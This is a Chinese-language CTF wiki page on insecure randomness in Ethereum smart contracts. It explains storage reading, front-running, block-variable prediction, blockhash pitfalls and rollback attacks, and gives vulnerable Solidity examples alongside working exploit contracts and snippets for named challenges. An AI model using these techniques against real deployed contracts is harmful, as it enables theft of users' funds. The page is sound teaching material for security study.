# Randomness

本節討論以太坊中的隨機數問題。由於所有以太坊節點在驗證交易時，需要計算出相同的結果以達成共識，因此 EVM 本身無法實現真隨機數的功能。至於僞隨機數，其熵源也是隻能是確定值。下面討論各種隨機數的安全性，並介紹回滾攻擊。

## 使用私有變量的僞隨機數

### 原理

合約使用外界未知的私有變量參與隨機數生成。雖然變量是私有的，無法通過另一合約訪問，但是變量儲存進 storage 之後仍然是公開的。我們可以使用區塊鏈瀏覽器（如 etherscan）觀察 storage 變動情況，或者計算變量儲存的位置並使用 Web3 的 api 獲得私有變量值，然後計算得到隨機數。

### 例子

```solidity
pragma solidity ^0.4.18;

contract Vault {
  bool public locked;
  bytes32 private password;

  function Vault(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

直接使用 `web3.eth.getStorageAt` 確定參數調用即可

```
web3.eth.getStorageAt(ContractAddress, "1", function(x,y){console.info(y);})
```

## 外部參與的隨機數

### 原理

隨機數由其他服務端生成。爲了確保公平，服務端會先將隨機數或者其種子的哈希寫入合約中，然後待用戶操作之後再公佈哈希對應的明文值。由於明文空間有 256 位，這樣的隨機數生成方法相對安全。但是在明文揭露時，我們可以在狀態爲 pending 的交易中找到明文數據，並以更高的 gas 搶在之前完成交易確認。

## 使用區塊變量的僞隨機數

### 原理

EVM 有五個字節碼可以獲取當前區塊的變量，包括 coinbase、timestamp、number、difficulty、gaslimit。這些變量對礦工來說，都是已知或者可操控的，因此在私有鏈部署的題目中，可以作爲惡意的礦工控制隨機數的結果。在公開的鏈如 Ropsten 上，這個方法就不太可行，但我們也可以編寫攻擊合約，在攻擊合約中獲取到相同的區塊變量值，進一步用相同的算法得到隨機數值。

### 例子

```solidity
pragma solidity ^0.4.18;

import 'openzeppelin-solidity/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

- 代碼處理流程爲：
    - 獲得上一塊的 hash 值
    - 判斷與之前保存的 hash 值是否相等，相等則會退
    - 根據 blockValue/FACTOR 的值判斷爲正或負，即通過 hash 的首位判斷

以太坊區塊鏈上的所有交易都是確定性的狀態轉換操作，每筆交易都會改變以太坊生態系統的全球狀態，並且是以一種可計算的方式進行，這意味着其沒有任何的不確定性。所以在區塊鏈生態系統內，不存在熵或隨機性的來源。如果使用可以被挖礦的礦工所控制的變量，如區塊哈希值，時間戳，區塊高低或是 Gas 上限等作爲隨機數的熵源，產生的隨機數並不安全。

所以編寫如下攻擊腳本，調用 10 次 `exploit()` 即可

```solidity
pragma solidity ^0.4.18;

contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract hack{
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  
  address instance_address = ContractAddress;
  CoinFlip c = CoinFlip(instance_address);
  
  function exploit() public {
    uint256 blockValue = uint256(block.blockhash(block.number-1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    c.flip(side);
  }
}
```

### 題目

- 0CTF Final 2018 : ZeroLottery

## 使用 Blockhash 的僞隨機數

### 原理

Blockhash 是一個特殊的區塊變量，EVM 只能獲取到當前區塊之前的 256 個區塊的 blockhash （**不含當前區塊**），對於這 256 個之外的區塊返回 0。使用 blockhash 可能存在幾種問題。

1. 誤用，如 `block.blockhash(block.number)` 恆爲零。
2. 使用過去區塊的有效 blockhash ，可以編寫攻擊合約獲取相同值。
3. 將猜數字和開獎的交易分開在兩個不同區塊中，並且使用猜數字時還不知道的某個區塊的 blockhash 作爲熵源，則可以等待 256 個區塊後再進行開獎，消除 blockhash 的不確定性。

### 題目

- [Capture The Ether](https://capturetheether.com/challenges/) : Predict the block hash、Guess the new number
- 華爲雲安全 2020 : ethenc

## 回滾攻擊

### 原理

在某些情況下，獲取隨機數可能過於困難或繁瑣，這時可以考慮使用回滾攻擊。回滾攻擊的思想很簡單：完全碰運氣，輸了就“耍賴”，通過拋出異常使整個交易回滾不作數；贏的時候則不作處理，讓交易被正常確認。

### 例子

這裏以 0ctf 2018 ZeroLottery 爲例，部分關鍵代碼如下。其中 `n` 爲隨機數，並且省略了其生成方式，但我們知道它的範圍是 0 至 7。

```solidity
contract ZeroLottery {
    ...
    mapping (address => uint256) public balanceOf;
    ...
    function bet(uint guess) public payable {
        require(msg.value > 1 ether);
        require(balanceOf[msg.sender] > 0);

        uint n = ...;

        if (guess != n) {
            balanceOf[msg.sender] = 0;
            // charge 0.5 ether for failure
            msg.sender.transfer(msg.value - 0.5 ether);
            return;
        }

        // charge 1 ether for success
        msg.sender.transfer(msg.value - 1 ether);
        balanceOf[msg.sender] = balanceOf[msg.sender] + 100;
    }
    ...
}
```

可以觀察到題目合約在我們猜對或猜錯時收費不同，分別爲 1 ether 或 0.5 ether ，我們猜數時多給的錢會轉賬還給我們。結合智能合約收到轉賬時會調用 fallback 函數的知識點，假設每次使用 2 ether 去猜數，如果 fallback 函數收到 1.5 ether 就回滾。我們可以固定一個數字一直猜，只有猜對的交易纔會被確認。

```solidity
function guess() public {
    task.bet.value(2 ether)(1);
}
function () public payable {
    require(msg.value != 1.5 ether);
}
```

並不是所有題目都涉及轉賬操作，但是通常都會有一個變量象徵着正確次數等，ZeroLottery 中就有 `balanceOf[msg.sender]` 在猜對時會增加，猜錯時清零，也可以通過它判斷是否猜對。

```solidity
function guess() public {
    task.bet.value(2 ether)(1);
    require(task.balanceOf(this));
}
```

以上兩種方法都是選定一個數字重複猜測，在本題八分之一的概率之下猜對五次獲勝，需要大約 40 筆交易才能完成。由於同一個區塊中產生的隨機數往往相同，我們可以稍作改進，在每個區塊中將所有八種可能都猜測一遍，其中必定包含正確的數字。進一步，如果在單筆交易中連續猜五次，那麼只需要有一筆交易成功確認就可以完成題目要求。實際上因爲題目合約的 `bet` 函數自帶了 `balanceOf` 非零的檢查，如果我們連猜多次，失敗了也會自動回滾。

### 題目

- 0ctf final 2018 : ZeroLottery

!!! note
    注：題目附件相關內容可至 [ctf-challenges/blockchain](https://github.com/ctf-wiki/ctf-challenges/tree/master/blockchain) 倉庫尋找。
